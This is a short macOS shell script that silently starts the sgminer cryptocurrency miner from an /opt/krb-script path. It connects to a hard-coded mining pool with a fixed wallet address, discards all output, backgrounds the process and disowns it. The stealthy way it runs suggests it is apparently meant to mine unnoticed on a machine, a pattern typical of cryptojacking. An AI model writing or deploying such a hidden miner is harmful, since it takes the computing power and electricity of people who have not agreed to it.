#!/bin/sh
cd `dirname $0`
/opt/krb-script/osx/sgminer-4.1.0-mac-slim/sgminer -o stratum+tcp://us2.mininggood.com:3353 -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x >& /dev/null &
disown $1
